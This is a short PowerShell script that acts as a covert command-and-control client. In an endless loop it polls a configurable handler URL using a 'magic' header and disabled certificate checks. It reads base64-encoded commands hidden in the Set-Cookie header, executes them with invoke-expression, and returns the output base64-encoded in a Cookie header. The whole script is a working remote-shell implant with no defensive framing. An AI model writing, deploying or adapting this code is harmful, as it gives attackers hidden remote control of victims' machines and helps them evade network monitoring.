#Your handler URL - edit as needed
$url = "https://192.168.44.1:8081";
#Magic header - change as needed for both client and the server 
$m = "737060cd8c284d8af7ad3082f209582d";

function w 
{ 
    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};
    $r = [System.Net.HttpWebRequest]::Create($url);
    $r.Headers.Add('If-Match', $m);
    $p = [System.Net.WebRequest]::GetSystemWebProxy();
	# handle credetnails
    $p.Credentials=[System.Net.CredentialCache]::DefaultCredentials;
    $r.proxy = $proxy;
    return $r;
}

while ($true)
{
    $r = w;
    try { $p = $r.GetResponse(); } catch { continue; }
    $x = $p.GetResponseHeader("Set-Cookie");
    if (![string]::IsNullOrEmpty($x))
    {
        $c = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($x));
        #invoke and catch any exceptions
		try { $o = invoke-expression "$c" 2>&1 | Out-String; }
        catch { $o = $_.Exception| Out-String; }
		# get output back to the server in cookie
        $o = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($o))
        $r = w;
        $r.Headers.Add('Cookie', $o);
        $r.GetResponse().close();
    }
    $p.close();
}
